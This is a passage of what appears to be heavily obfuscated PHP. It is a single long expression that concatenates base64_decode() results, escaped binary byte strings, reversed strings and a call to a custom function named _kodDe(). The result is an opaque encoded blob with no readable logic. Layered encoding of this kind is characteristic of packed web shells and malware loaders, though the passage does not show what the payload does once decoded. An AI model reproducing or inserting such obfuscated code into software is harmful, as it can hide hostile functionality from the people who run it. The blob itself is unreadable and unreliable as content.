RDcg==').base64_decode('s7b2ls2Hfrb5mbe2Xn9a2wvb9rFuLXWaq29qu7F8x4vdW4d6Xn3pkTuXnXX3k5P/crBZN1bz7A==')."\x67\xf1\x9b\x3e\xbe\xc0\x7f\xfe\x23\xab\x9e\xf9\xe8\x98\xfd\x7b\xbe\x7d\xc4\xa6\x59\x4b\x6e\x4a\xa9\xde\xaf\x5d\xfb\xc9\xe0\x53\xfb\x87\xdf\x99\x17\xdc\x78\xdc\x29\x47\x6\x1a\xb6\xcf\xbf\x79\xd5\xa7\xb7\x36\x9c\xf1\xe7".base64_decode('ZVOff3HgtmnH/eWa8x7Op2vvTA8/P3bVNztOenrvyA0/3XbCSy9/Y/ryZ85W/5ite/emKd9aeg==').base64_decode('1N45efuDo773zqeH3H5S7n+uT752Vy540Cf/u2Cfe/7R7DltvPv0ocfPurV078qf/KrxkqeP+w==')."\xce\xbb\x8f\x8e\xac\x3d\x7c\x5b\xcf\xb7\xe\xfd\xfe\x3d\x91\xbd\xb7\xdd\x7f\xf8\xf0\x77\x26\x9f\xbc\xe2\x91\xfd\x27\xfd\x64\x57\xef\xe4\x3f\x3f\x78\xf0\x35\xb3\xff\xfc\x8b\x6f\xcd\x36\xde\x3f\x72\xfd\xf5\x1f\xdb\xcb\xee"."\x3c\x7e\xf0\xd6\xb5\x8f\xbf\x7e\x5b\x76\xc9\x8b\x85\xd8\xc7\x83\x5f\xbb\x76\xd3\x2f\xfe\x3e\xf4\xd9\x17\xf\xbc\x74\xe7\x4b\xb7\xbd\xba\x7a\x79\xb6\xe1\xbf\x2e\x3b\xc9\xca\x3c\xf6\xca\xdb\xf7\x6e\x7a\xe1\x99\x9d\x37\xf5"."\335\373\307\13\202\27\155\234\165\371\212\155\27\345\316\53\237\175\350\223\307\116\375\351\143\337\170\356\353\17\132\53\277\243\251\133\356\371\344\243\167\37\337\167\352\323\277\314\36\357\333\375\367\366\53".base64_decode('X7mq/YvPWk6Yc8Xww9N+Mu8fo/v9/sBDT//g6XPN9eVj/nJmZMPszZN++4u7v1sa/fvzvQvPKg==').base64_decode('ds8pvfL503995o/XXTX/tOfP/vFTmW1nhC7xnfnpG28ctmjn2N+vvv3BX/v/89HnO6/esf21xw==').base64_decode('v/jLX995ec+O/5z57w9uv9j/77Wf/utX4++d+fiTte++N+mYz1847M3Hf/ej7o4tVy/+/pNtfw==')."\74\347\112\155\155\317\41\213\57\177\356\360\261\337\334\362\114\352\346\177\15\54\173\351\153\366\201\217\274\260\176\277\257\175\64\270\317\316\253\72\333\247\174\370\352\123\157\335\261\376\70\55\165\335\117"."\132\217\334\61\163\105\153\351\210\53\317\375\306\317\56\374\363\176\33\66\334\143\157\263\157\71\374\243\47\33\152\143\361\367\166\334\321\334\273\163\347\155\107\317\250\31\337\375\341\53\267\114\33\270\375".base64_decode('szX3n3FT9r9rf/nbH40+cMulmfbSeT8+Zpp21PtHpXddFUzMC7y25NF/btj+zX1iN5139K1X3g==').strrev('xÜ½~no›V^ûÛÌÅtşÃ½è¹+•Îüï;â§À÷²}o§ôë_ÑûÎiİn9m‡£ø±')."\x43\xb8\x5b\x3b\x6f\x7f\xdf\xd3\xe7\x7f\x72\xf6\x94\xc9\x53\x6a\x23\xe1\xa7\x26\x7d\xb0\xe7\xdc\xf1\x17\xdf\x69\xff\xf3\xd8\xf9\x5f\x7c\xb6\xe8\xeb\x73\xbe\x58\x7c\x4f\x43\xf0\x6f\xcf\x9a\xfa\x47\xa3\x3f\xfb\xc1\xf1\xd7"."\x6d\x7a\x65\xec\xe6\x97\xdf\xff\x7a\xe2\xba\x5\x9e\xae\x13\x5f\x3e\x60\xcd\xcf\x8e\xda\x7a\xdd\x77\xfe\xf1\x79\xf4\xe1\x19\xcf\xe6\x1f\xfc\xe4\xf9\x7\x3e\xfc\x64\x55\x7c\xef\x9c\xd3\xc7\xa3\xde\xe0\xea\xbd\xd\xc1\x8d"."\x27\x6e\xbf\xe5\x6f\xbf\xb4\x67\xbf\xf5\x6e\xf2\xb3\x6b\xbb\xef\xec\x3a\x3c\xd2\x31\x7b\xc6\xf3\xaf\xbd\xfb\x74\xf4\xe5\x1f\xbf\x7a\xe8\xa2\x5b\x8a\x6b\xf2\xe5\x9b\x56\xdc\x7a\xe1\x1b\xb1\x5b\x8b\x33\x97\xbe\x7d\xd2\x2b".base64_decode('9zVMOm195teZhdo7R+rrMlOzc89ce/H4UUOjyrbX/xF9sv59O/VwcllpyWHfWvb6MR8nLvjs7A==')."\263\316\73\345\47\301\123\106\356\376\316\335\321\305\143\351\275\247\55\176\146\312\276\157\326\257\371\323\246\375\26\267\56\70\375\335\313\16\313\154\320\357\31\336\357\355\145\7\56\334\277\246\346\353\147"."\x3e\xfa\x85\x99\xba\xed\x88\xdb\xde\x39\x64\x78\xcb\xb6\xfa\x4d\x7\x3f\x70\xf5\x96\xd\xe7\xac\x39\xfe\xc5\x5\x99\x7d\x1e\x3c\xea\xe2\xe7\xea\xef\xeb\xdb\x9c\xf8\x50\x3f\xa2\x61\xc5\xb4\xff\xfe\x55\xdd\xd0\xf9\x7\x64"."\x7f\x79\xfc\x86\x8f\x4f\x58\xf3\xe1\xde\x7b\x6e\xb9\x67\xea\x8a\xa3\x16\x98\xef\xee\x7d\xc1\xd7\xbc\x76\xeb\xfe\x3b\xa6\xe\x9e\xff\xf6\xfd\x91\xc4\xad\x97\xfc\xcf\xe0\xb3\x81\xcd\xf7\x1e\xfe\xcf\xf\x5e\x8f\x7e\xef\xbe"."\xcc\xf0\x91\x4f\x1b\x3b\xfe\xf8\xbd\x57\xbe\xdf\xf8\xfb\x57\x1b\xce\xff\x6b\x70\xc9\x17\x3f\xbd\xeb\xf3\x2d\x1b\x66\xbc\x52\xfc\xc9\x35\x17\x1f\x7b\xe3\xde\xd8\xef\x2\x47\xcc\x54\xce\xfd\x70\xce\x51\x27\x4c\x79\x72\xdf"."\354\273\53\317\270\366\261\163\256\33\371\361\171\207\374\140\373\37\237\353\234\163\303\305\303\247\36\160\334\372\73\126\76\167\307\222\17\172\16\360\314\72\360\250\137\34\361\303\53\156\70\371\336\274\147".base64_decode('fvdt4RkPHHDc0et+d0Nb346F6+67Yt7bv3kj/br55o03vvO/N16yc9/SSy+98NoZtzYHflfz0g==')."\155\167\376\361\247\57\266\131\127\274\370\263\160\377\263\43\173\377\266\345\336\31\337\74\102\133\273\353\303\235\237\135\165\372\335\167\75\362\311\107\267\326\255\377\306\15\377\73\332\376\352\71\372\363\263"."\216\151\271\247\365\202\217\157\232\162\315\11\377\174\160\312\41\273\136\237\375\237\134\346\210\157\336\343\333\323\373\260\147\367\143\255\53\312\273\174\57\314\31\156\175\371\267\277\274\365\312\223\17\34\375".base64_decode('4Ohfv3NHk5lY++DvD62//frk5Y+G7l45Pu/Cp+46MvbjpSs3+tR/v/PGz14+5olPP/zr7erWsw==')."\x3e\xfc\xd5\xa7\x67\x9d\xb9\xee\xdf\x6f\xf5\x5f\xfd\xc3\xc7\x1f\xfa\xe7\x17\x8b\x1e\x5f\xf3\xf1\xa7\x9f\x5e\xbc\xe3\xdc\xdf\x9e\xf5\xf1\xe7\xe3\xe3\x8b\x9e\x38\xe4\xdf\x8f\x7f\xf1\xe6\xf8\xf7\x5f\xbe\xfa\x87\x67\xad\xfd"."\367\355\257\377\340\254\117\176\71\76\347\254\307\376\365\362\61\377\371\342\37\127\77\372\355\303\233\237\334\160\307\244\277\266\254\172\156\345\325\173\137\270\376\245\327\36\71\353\355\346\307\77\171\155\303"."\123\173\376\64\176\352\375\17\334\333\375\372\237\314\343\147\166\277\23\175\360\345\105\13\232\316\374\347\336\306\143\367\36\60\163\303\111\157\147\56\311\175\175\347\221\157\234\366\37\273\351\373\77\324\137"."\xba\xf7\xe1\xcf\x9f\xde\xbd\xec\x86\x2d\x8f\xfc\xe7\x24\xed\xd6\x87\xa6\x5d\xbe\xed\xd3\xfe\x83\x6f\x98\xf6\xbe\x67\xd1\x81\x6f\xde\xdd\x77\xcf\xaa\x17\x72\x47\xab\x2d\x57\x9c\x33\x25\xfd\xe6\xe2\x5a\xeb\x9a\xda\x1b\x8e"."\174\161\154\277\3\336\374\317\276\307\356\54\174\143\305\321\314\170\161\54\153\367\25\107\101\370\6\2\352\61\135\113\225\262\160\353\12\146\115\263\346\316\241\37\251\341\164\176\160\65\60\366\40\15\114"."\133\143\372\60\143\127\213\245\276\102\316\206\334\253\207\107\207\6\64\340\176\101\323\152\310\264\123\175\145\220\174\315\230\11\320\106\120\122\233\323\0\37\363\130\314\352\364\220\66\234\203\53\374\354\210"."\xd1\xbf\xba\xf\x32\xcf\x9c\x1\x9c\xdf\xbc\x46\x68\xe6\xbc\xb9\xd0\x87\xb9\xd3\x21\x6a\x60\x30\x6d\x8c\x65\x41\x60\x92\x29\x8e\xf6\xe5\xad\xd5\xc0\x9f\x67\x2d\x3b\x3f\x6\x17\xff\xd9\x62\x5f\x61\x80\x59\x6b\xce\x66\xe5"."\216\225\322\175\375\303\145\126\11\224\235\37\132\155\246\7\331\121\331\312\146\212\171\350\373\234\71\263\130\255\350\274\223\32\141\175\204\326\15\25\263\326\310\40\10\243\146\63\350\364\31\60\264\226\76"."\x38\x6a\x67\x40\x42\x3c\x83\x75\xa0\x6f\x30\x6f\xda\x3\x4c\xdf\xc6\x1a\xcd\xd8\x25\xe8\xc0\xdc\x99\xd0\xa0\xc6\x99\x90\x76\xc6\x9c\xe9\xac\x4a\xd0\x26\x6b\x84\xb2\xa7\xf3\xf1\x58\x6d\xea\xd9\x11\xe8\x68\x69\x28\x37\x98"."\37\313\262\31\200\314\103\331\341\134\252\4\47\375\274\135\324\322\203\240\204\256\233\253\213\106\26\116\266\263\147\103\221\71\315\354\57\256\6\26\276\220\32\350\103\275\244\201\176\153\365\320\160\232\151".base64_decode('JK82R8pMlcsyRk2NXRLPZlM9p4HdkYysNvvKkHZspGCZWUCiOY2QdiboK8+YOw+6OLeB9RUg2Q==').base64_decode('YbNgj8FozZoOGc3yQP9wEQa0kQ3QjNmz2DDA0E1nNRQHzJHVYzm2EAA/y+awnjeYfLKs5UaYkQ==')."\311\274\171\320\213\162\146\310\310\247\140\40\147\262\25\324\70\35\152\232\61\3\132\324\157\352\106\212\51\54\66\316\200\350\241\301\342\230\305\104\227\331\362\360\140\141\65\234\242\162\131\43\255\61\104"."\131\75\226\56\214\262\331\232\65\217\341\322\240\226\33\32\200\165\122\314\245\12\331\374\30\224\317\226\310\14\326\365\306\171\200\211\243\245\325\172\332\200\114\163\346\302\364\246\262\143\245\341\21\30\305"."\xa2\x59\x30\x72\x79\xa8\x2d\x33\xd8\x67\x68\x16\x94\xab\xa7\x32\x3\x23\xc3\x80\x28\xc3\xf9\x52\xd6\x2c\x2\x59\x19\x1a\x2e\xc\xe6\xb3\x90\x4c\x1b\x34\x6c\x33\xd\x81\xb9\xac\x8e\x74\x6a\x48\x2b\x30\xb9\xd7\x6a\x2d\xad".strrev('YÈ@!ÁÅij<Ğàç/^@Údº¼:h`˜=´¯bf	¡`5"fµ#aé\\ÄÁµvpü±Å3ö')."\163\140\0\264\321\314\352\301\1\150\123\151\240\154\146\12\114\137\335\34\104\255\207\142\207\373\163\175\6\137\237\14\115\214\61\63\137\146\372\103\243\175\251\221\362\0\364\173\326\54\76\321\320\315\102".strrev('´˜¥¢Ùˆ™ÏÒ»0â ‚4,eÂÌ]=!ìİTÀ¦HÔ´'."\r".'FlìC³fÊF¡Á‘µi64¯º')."\x9a\x2b\x7e\xcb\xfa\xd4\x25\xdd\x2a\xe7\x6c\x2a\xdb\x93\x6f\x90\x98\x29\xaa\x51\xf0\xe5\xb5\x2\x57\x69\x6a\x7\x5a\x2e\xc3\x68\x11\x40\x51\x74\x9d\x99\x3a\x40\x9b\x6c\xa1\x28\x3\x6a\xdd\x0\x37\xf2\xba\x90\xc6\xd3\x2b".base64_decode('FpZTyAiwgEZStcHBhFxKumBL0SjkiE3I1hjQU9xCnzwCK6EJ3sZGJY9oRBbgTBe+yp0uCJflCw==')."\273\1\63\223\316\231\345\214\243\256\114\312\127\145\254\151\377\252\305\364\271\341\134\141\53\45\315\243\50\334\141\174\300\140\216\161\245\371\340\272\150\211\156\53\231\24\265\110\267\230\212\27\215\122\311"."\x1f\x46\x2e\x88\x75\xb6\x85\x2d\x3\xb8\xe5\x21\xbb\x19\x74\xfa\x17\xa0\xc5\xfb\xd8\x5c\xd3\xbb\x9\x5b\xb3\x6\x7c\x72\x83\xbd\x72\xac\x51\x40\x1d\xcc\xe5\x7c\x4e\xcb\x7d\x6c\x42\xdf\xd5\xa9\x26\x3\x89\xa5\x92\x9a\x26"."\66\361\166\124\137\321\131\61\367\322\220\313\50\340\34\30\206\142\173\167\354\34\337\270\171\367\125\167\355\276\164\373\370\43\127\354\335\176\327\370\143\127\241\340\256\207\56\33\337\376\203\267\256\131\277"."\353\241\113\167\75\164\366\336\15\367\275\367\350\45\343\33\167\354\375\356\143\343\133\267\215\377\170\303\256\235\217\355\175\142\303\236\155\27\357\172\350\316\335\133\57\34\137\377\300\256\235\233\307\57\270".base64_decode('fnzDxt1XXLrrsa0o/e4LRMko2fidW3DeR88df+ihvTds47HvPXoObGlZMT2J0yJsYgheKwsVwA==')."\x68\xdd\xf2\x29\x9d\x39\x1d\x8d\x98\x42\x3c\x32\x60\x45\x3d\x3b\xab\x97\x14\x9b\x28\xec\x69\xe8\x6f\xc1\x2c\x78\x29\x6e\xb2\x39\x36\xa\x38\x5a\x61\x63\xed\xe3\xf8\x9b\xd4\xf3\x45\x8c\x85\x30\x4a\x7e\x6a\xab\x2c\xec\x5c"."\x82\x44\x26\xaa\xa4\xb4\x1\x85\xde\x3c\xd0\x56\xf9\xd8\x9d\xf4\x28\x9f\x19\xd6\x6a\x52\x23\xb1\x94\x5\xd4\x82\xca\x70\x1c\x85\x72\x9f\x18\x1e\xd6\x3\x7c\x8f\xa0\x14\xf5\x52\xde\xb0\xb0\x9a\xb7\x62\xf6\x61\x13\x2e\x5".base64_decode('33owxHSumWrzTSOqYD2edIE0dfiz3tkmBYtRlT4NfWaalD6Un90f9Sq2yb5dy7YqdvFGMAzr5w==')."\127\30\102\262\16\315\222\354\250\350\365\125\5\146\23\72\340\44\155\16\12\341\44\212\162\224\163\34\100\364\115\324\107\74\12\155\212\207\14\257\107\161\232\374\143\165\20\246\142\201\373\42\46\313\247"."\320\170\320\115\242\331\233\52\73\127\322\213\71\176\217\27\64\213\243\164\204\1\231\345\261\165\165\62\121\145\100\171\67\35\221\210\160\224\355\52\11\345\161\227\205\356\206\31\314\41\42\55\156\233\211"."\x6a\x87\x68\x32\xd\xa\x61\xbf\x6e\x9\x63\x83\x92\x9e\x31\x18\x9f\xad\xe7\x49\x4a\xa0\xed\x3e\xe9\xaa\x6d\x3e\x16\xe7\x33\xab\x46\xa3\x8\x5f\xa5\x72\x1\x37\x9\xc8\x29\x35\xb0\xe3\xa\xf8\x69\xb4\x86\x4b\x8e\x9b\xc6"."\x5\x8b\x8a\xd9\x22\x1e\x6c\x7b\xfe\x22\x30\x69\x61\x46\x98\x52\x3b\xe1\x5b\xd8\x12\xca\xd0\x9c\xfb\xf6\x92\xaf\xf8\xd6\x16\xc9\x17\xa\x4e\xd6\xe4\xf5\x7a\x25\x29\xbb\xd0\x4a\xc4\x5f\x2a\xeb\x3c\x31\xa\x4b\x64\xcb\x36"."\xd6\xc1\x59\x92\x33\x53\xc\xd9\x84\x6a\x0\x4a\x1e\xc2\x93\x3b\x11\xbc\x95\xeb\xec\x20\x12\xd6\xdf\x8f\xca\x6b\x22\xc6\xdb\xca\x34\x5\xf5\x61\xae\xaf\x11\x7d\x10\x3a\x32\xcb\x37\x7\x7d\x92\x1\x7\x9a\xd1\x3\x93\x80"."\x46\x17\x86\x74\x8a\x6f\x26\x70\x93\xd6\x7c\xa6\x80\x4a\x50\xab\x59\xea\x99\x98\x13\x80\x96\xb\x39\x6\x45\x9f\x28\x49\x9c\xce\x4c\x93\x73\x38\xf4\x42\x46\xca\x34\x5f\x4b\xdb\x52\xa9\x6a\x1f\x8c\xb7\x4f\xc\x95\x36\x4d".base64_decode('xOsZsEH1SwM4DAlY3g4nCqH+ezlWoZlHO2qG0kfYHaFIS3JfERcIibOT4fqSrLaMDUW0axe4lg==').base64_decode('tZXT2AWxhS2YCjpHzbIlG5fogkZg+wQVMThsv0ZIrWbYgScSblFbw3GRTy2W3Z6IZAdIgc6wmg==')."\x48\xc4\x24\xbf\x44\x60\xc2\xb5\x34\xd6\xaa\x6\x63\xb1\xa5\x61\xc0\xd7\x26\x69\x9f\xc1\x56\xbb\x42\x93\x0\x87\x84\xf5\x2e\x5e\x85\xb2\x2\xa3\xcc\x98\x61\x97\x2f\x98\xa3\x48\x28\xa0\xe8\x8b\x56\x44\xb0\x3d\x10\xe7\xc6"."\x1d\xb3\x7c\xd\xbe\x46\x91\x16\x55\xa8\x62\x4b\x96\x66\xe6\x70\x22\x91\xc\xc4\xab\x38\xfe\xa1\xe\x81\x60\x6e\xc0\x9\x10\x64\x68\x8f\x2d\x57\x82\xb1\x48\x57\x47\x34\x41\xfd\xdd\x50\x78\x34\x26\xc5\x13\x15\x7e\x88\x66".strrev('bRªÍ)v…¸Œh$¼‰rcÈ'."\r".'?!ÂÔ%’‚0ğJÆ13¹´”Æ2há)$gPø¡£*n').base64_decode('UaW1qzMSDgaSIWVpaKVCbc6gAH+3p7anpmdqT11P/Spfj9Xrl1gHQ55fCHS2wvg08a+MBYSgIw==').base64_decode('gbZs+hmLB4IR1peWQAI+Y8Ew/dhz5d27Hrlsz/e3j194KSpo97Xn7r76AcTOYRZu+yV7Hr9s9w==').base64_decode('lTt2XwKsl7J3x4O7Hntiz5Xbxrdv2b354T3Xnkcj3rr17vGLtvGGKW9d8fjuy27ibB3l5jwo9w==').base64_decode('W+sv3fPYdszU3Xj27vsv3r310vGLbhi/Ztuey3aM/+i74+dfunfHVZPdmEjD3WwuwRGB/wzsRA==')."\x82\xce\x4f\x8f\x35\xd\xcf\x4d\x3d\xfa\xad\xc3\x36\x43\xe8\x97\x99\x3e\x10\x85\xf4\xd3\xba\x42\xd1\x60\xc8\x6d\x72\x27\x7\xc1\xe9\xd2\x54\x8a\x62\x54\x51\xa\x38\x7a\xb\x9c\x36\xb1\x30\xf1\xe6\xd2\x5c\x3b\x61\x2b\xd6"._kodDe('LvLyfTkKggrD9DrR0wCGlUh54DKKMihlwMAxbDTvCZbWBcmiPiqECqYF2jc3TyS8yuOFwvWVSPY=')."\53\6\326\170\360\66\107\354\377\224\32\274\255\43\200\216\135\117\324\141\137\73\104\257\274\166\145\255\247\301\323\130\257\200\7\55\232\3\374\146\51\65\140\236\300\363\71\52\361\244\34\241\106\117\103"."\xbd\x52\x53\x1c\xa8\x81\x76\x89\x71\x45\xad\x57\x69\x4a\x4b\xd1\x3c\x75\xd0\x60\xb9\xb9\x22\x2d\xa2\x83\x96\x5d\xd2\xc\x44\x18\x95\xb4\x87\x83\x78\x7e\xf4\xeb\xf0\x85\x95\xf6\x89\x1c\x74\x9e\x50\xa\x37\x4c\x9\x44\x5b".base64_decode('nSmpC63OWqLkm/bZ3GkPm+baeiUFtj5VIkk2x2A0OwajbhoQms4lfL6pIY9CzTppszSLTRRAyQ==')."\x54\x61\x28\x9d\x2d\x96\xd6\x44\xdd\x40\x93\x43\xd3\xa3\xf\x1e\x83\xd\x5d\x78\x49\x88\x9e\xf1\x8\x36\x83\x18\xce\x27\xb1\x4a\x1c\xf1\x6d\x56\x43\xd9\x4f\xda\xcf\xbc\xd5\xcf\x68\x25\x78\x94\xe8\x58\xc9\xfb\xc0\x70\x99"."\153\241\161\317\150\330\100\65\224\14\266\123\54\117\110\150\236\111\115\161\40\252\30\116\305\201\42\374\260\5\351\350\162\301\4\141\22\111\27\216\142\353\145\152\217\231\10\266\207\72\2\76\330\5\50".base64_decode('JtD0mJlDlLgWUz4KqnUMP6mIDVmS1IrWlWoj9ouOQrEfGgOzrxDXGBrJ0lxLnRlBkdyFXyyeVA==').base64_decode('0QAAeZaobq203Ug2CNjgcIhxjH2InzKZW6ZMinn6Q4XjMoOxaFuYmZ62ghyhmDEdiVrjYeyrBg==').strrev('şVòï©„f	]7¿Ê"\\BK’TàÙ¾@g‚€Ó8#÷ğ·øg(Í'."\n".'/å’QXWê')."\xdd\xce\x2d\xf5\x71\x44\x2c\x2e\x5\x2\xf1\x40\x47\x82\x7\xe3\xcb\xb9\x79\x11\x87\x51\x33\x23\x35\xda\xd5\x21\x28\x7e\x24\xb0\xc\x21\x4b\x4c\x70\x38\x8c\x5a\xd7\xf9\xa6\x2e\xaa\xef\xa1\x76\xa3\xf4\x93\xfe\x2c\x66\x21"."\x6c\x4b\xd7\xbb\xa6\xd1\xa3\xcc\x5e\x57\xf\x69\xb8\x93\x17\x3b\x6b\x14\x18\xcf\x8a\x6b\x39\x2d\xa2\x46\x62\x4b\x68\x98\xb8\x4a\xc\x15\x32\xe2\x80\xa4\x74\x2b\x88\x81\x4e\xa\x6\xda\x62\x5b\x17\x5f\xd\xa\xc2\x61\xc6"."\7\104\143\313\3\302\373\236\24\1\20\341\214\317\177\106\167\317\160\217\17\61\13\326\52\141\7\332\332\242\60\76\206\270\373\201\263\44\344\16\160\116\305\3\73\206\232\63\373\231\43\56\104\20\31"."\xbb\x40\x7f\x57\xb0\xf\x42\x2b\x21\x43\x9a\xf8\x15\x18\xe1\x8d\x8\x78\x4f\x57\x7b\xd6\xf6\x9c\xd2\xe3\xf5\x51\xe3\x5b\xcc\xbc\xf4\x78\x44\x93\xd4\xd0\xa\xb4\xc7\x26\x12\xe\xcb\x61\x35\x5f\xe6\x77\x5c\xa\xea\x25\x7c".base64_decode('0VVLAwvgB453C+B8AcGFzXwyQ6etjaK/S5JrQ+hvBP1Ekmi6DJ4ALclIeGloLf5HRNTzgaRWbg==')."\xce\xc\xe1\xe8\x5a\xf4\x2f\x22\x30\x6b\xc3\x51\x77\x61\x2d\xa1\xe4\xf2\x50\x88\x26\x60\xdf\xf0\x2b\x92\x22\x82\x3\x5d\x95\x5c\x69\x62\x3\x14\x88\x16\x6\x29\x50\xb4\xaa\xd6\x91\xc1\xf4\xf6\x4e\xab\x57\x55\xbf\xd5\x5".base64_decode('+MJd1dTVntxYC3tIIBEU1NeBEJW4QMxFnIjAHURCeEk81tUphdsDy8LRJSzkZ2YVylQoWmkNJw==').base64_decode('0BAFGTIKv5VyGBhOwhbJbLMDpVsRZUcBiefHpwlKmZ2rrKUrHGmVfSPghLChEKoOe8oU1jgWJg==').base64_decode('XhJYAA85+yboxgJkDFiADgALkeFiAeIfkwVIR1kAH29CURaHzpronMgOkFltiFv7zs+kJD82Lg==')."\21\57\21\213\111\102\2\172\246\120\44\367\1\130\126\54\211\262\374\64\5\142\60\111\32\364\333\263\152\21\141\200\127\61\134\244\306\354\166\322\260\271\13\2\352\222\211\232\235\242\112\303\304\322\130"."\252\226\131\351\20\321\250\152\112\222\174\262\67\313\0\41\5\243\142\177\220\143\13\21\22\126\70\45\22\156\32\164\36\273\70\51\132\305\117\123\140\45\353\201\137\266\103\225\314\42\110\114\215\76\160".base64_decode('FMzEGvTnEPrTAxmYRKQHmlHrga23h7Ht3T0jDQ1e9M9c9LcF/Q2ivyEMaOsZmdOGPua19frh+g==')."\272\247\247\146\242\1\207\4\154\330\41\130\103\203\54\227\301\167\312\164\26\273\123\122\355\74\273\144\40\107\72\41\270\247\227\11\42\334\32\217\165\122\276\105\11\267\51\324\311\210\122\113\257\37\152"."\xa1\xef\xc1\x78\x8\xaf\x29\x9a\x8a\xc5\xd5\xd5\x3a\xe4\x64\xb\x6b\x15\x70\x41\x50\xef\xcc\x15\x8e\xb6\x86\x56\x28\xb5\x46\x66\x44\xd5\x34\x15\x32\xe3\xb3\x2a\x2b\x48\xa9\x28\x89\x95\x40\xdb\xa\xf7\x9f\x20\x1\x4f\xa".strrev('0Œ‘Z ´b'."\n".'€¨LŸ0;>áG®\\ÂÃ(¡‰nĞ\''."\n".'2ì¡?#íËfWˆÛà­\\')."\x90\xb0\xa6\x7\x4d\x42\x7f\x8\xb5\xc1\x47\xa7\x52\x5e\xa3\xc6\xc6\x84\xa1\xf3\xad\x2\x11\xc4\x2a\x7\xff\x48\x39\x4b\xcc\x41\xd2\x4e\x2d\x5\xe\x9b\x86\x3a\xe3\xe1\x8e\x40\x7c\x25\x8c\x80\xe0\xf7\x61\xe9\x99\x39\x87"."\325\272\10\30\126\227\344\101\41\212\32\41\173\124\100\204\5\235\127\41\45\232\27\140\142\250\213\142\225\233\277\327\61\123\156\17\373\200\145\65\305\122\350\377\65\123\254\32\351\327\61\361\214\100\243"."\331\207\235\37\166\47\233\230\332\61\331\127\36\21\46\36\32\302\266\342\114\43\105\330\244\13\130\316\54\364\13\70\166\132\40\134\312\341\57\104\347\362\354\276\123\117\243\376\160\221\74\373\112\345\314"."\x14\xcf\xad\x49\xb2\x67\x3e\xa9\x6c\x4\x85\x5b\x67\xbc\x17\x63\x74\x61\x9b\x4a\x5b\xa0\x2b\x22\x43\x4\x66\x39\x66\xd\xcb\x60\x60\xe0\x60\x9c\xc8\xff\x40\xa1\x4\x8e\x43\x85\xf8\xc6\x7\x96\x73\x4f\x1d\x65\x16\x99\x7".base64_decode('XBtNDZRUu4q1zzGlKOhwMQ3HV+gz8e9SNx2dl8sF7NmIyT1hjOoaGzzT68UIizHC3l50reCYuA==')."\xba\xc6\x7a\xc7\x6c\xd5\x4d\x9f\x35\xb\x20\x62\x48\x2\x5d\xc9\x98\x8a\xf6\xc9\x78\x8\xef\x5a\x40\x84\xa7\x58\xab\xf8\x28\xf0\x81\xa0\xc8\x8\xc4\x96\x8f\x58\xbd\x12\x8a\x2e\x9\x47\x43\xcd\xd8\x63\x0\x62\x36\xd8\xa0"."\x83\xa4\x10\xbb\xa0\x9d\x9b\x4f\xcd\x9c\xcf\x88\xed\x19\x88\x3f\x44\xc\xe\x62\x11\x55\x26\xd8\x1a\x30\x33\x8b\x53\x26\xc\x69\x4a\x1b\xf0\x9\x7b\xb6\x70\x4c\x8d\x20\x9e\x5e\x95\xe5\x87\xe1\x18\x8\xbb\x1d\x2e\x51\xa9"."\xe5\x0\xfd\x56\x55\xe1\x45\xc8\xa7\x9\xeb\x2\xbb\x54\x96\x6c\xfe\xc\x93\x68\xf2\x77\xf0\x6c\xc4\xf4\x0\xe1\x46\x40\xf8\x15\xe1\xc2\x79\x12\x57\x4e\xe1\xdc\xf2\xb6\xc\xf9\x5d\x5e\x88\xd\xb3\x9\xc7\xe0\xc4\x94\xe3"."\232\57\222\253\216\312\335\252\373\62\130\130\25\210\313\176\246\133\300\275\123\102\206\56\311\57\10\271\205\142\25\222\153\262\202\273\171\330\173\100\7\363\331\204\370\202\34\363\146\247\352\242\163\150\221".base64_decode('WlwHIJnVFauIsBB7wVXAWaOSMeXbSZgWcgRkn3ZWOFSR3Ue3tsBUOY3r89jiMqHn4MqiNUWMOw==')."\x84\xf1\xa7\xb0\x8f\x13\x46\x1f\xd4\x9\xa6\x2b\x21\xe4\xc\xf3\x81\x92\x52\x55\x5\x4a\xa6\xa2\x11\xe1\x44\x1a\xdf\x4\x9\x8c\xe9\x65\xd2\xd\x31\x48\x63\x6\xdb\xbe\xdd\x17\xc1\xbc\xa9\x5\xb3\x93\x5f\xd4\x2e\x17\x37"."\x60\xc0\xd2\xa1\x2\x9c\x37\xc4\x3c\x9f\x3c\x15\xf8\xb6\xb5\x22\x25\xf6\x26\xf3\x65\xf3\xcc\x9c\xb2\x91\x96\x49\x26\xc0\xf8\x6\x5b\x32\x6a\x2a\x17\x50\xc9\x5e\xd9\x4c\xe\x21\x15\x1\x4a\x86\x39\xcc\x79\x28\xd\xcd\x1"."\x2d\x1f\x9b\x6f\x1\xfd\x0\x61\xbf\x25\x16\xe3\x13\x2e\xa7\x48\x99\x98\x21\xf4\xa\xc7\x2f\x19\x4d\xb6\x97\x96\x5e\x7f\x98\x2c\xe3\xc\x99\x6d\x81\xf4\x7d\x86\xec\x5\xc6\x27\x9c\x6f\xf3\x75\xb4\x98\xcf\xe\x76\x33\xe0"."\145\270\206\20\113\225\332\322\311\323\13\267\273\164\64\244\261\47\0\372\111\126\276\322\44\32\321\156\340\225\60\52\41\214\4\345\13\14\134\177\107\314\176\116\300\20\317\15\16\362\34\104\54\34\203".base64_decode('vD4dm+lRo6kQd5WKMlK/hl+dqUvyfj4BramaLwgJeYUlIhP76grjumB3UDZiFfmVmQTtJTWRTA==')."\22\275\166\345\41\350\30\227\350\274\57\13\321\2\307\320\206\21\215\251\355\210\71\216\61\156\314\260\222\16\272\317\162\301\266\156\43\336\57\355\47\26\360\260\37\315\47\112\26\364\256\27\46\173\15"."\x22\xe9\xfc\x8b\xa9\xfb\x80\x8f\x3d\xc1\x8a\x4\xe8\xcf\xca\x7c\xc6\x8b\x1a\xee\x65\x5b\xb7\xcd\x9d\x9d\x11\x7b\x5f\xc9\x15\x9b\xe4\x3f\x20\xcf\x49\xed\xb0\xe4\xdf\x58\x1b\xd2\xb1\x11\x24\x93\x1a\x55\x28\x54\x41\x57\x2a"."\73\7\115\304\367\202\211\130\127\234\335\141\341\60\26\275\251\361\120\160\45\277\15\342\320\266\300\62\67\44\214\105\247\201\45\125\301\134\240\207\341\344\344\254\306\143\130\362\31\212\264\271\62\44\332"."\xb9\xab\x6c\x27\x4c\x8d\x84\xa3\x4b\xab\x46\x20\xbe\xa4\x43\xca\x42\x81\xe1\x64\xa8\xc3\xd\x73\x96\x40\x61\xb1\x2e\xee\x6f\x88\x0\x43\x81\x38\x73\xee\x8e\xc3\x2d\x91\x58\x50\xca\x13\x8e\x55\xe\xf\xe7\x86\x38\x90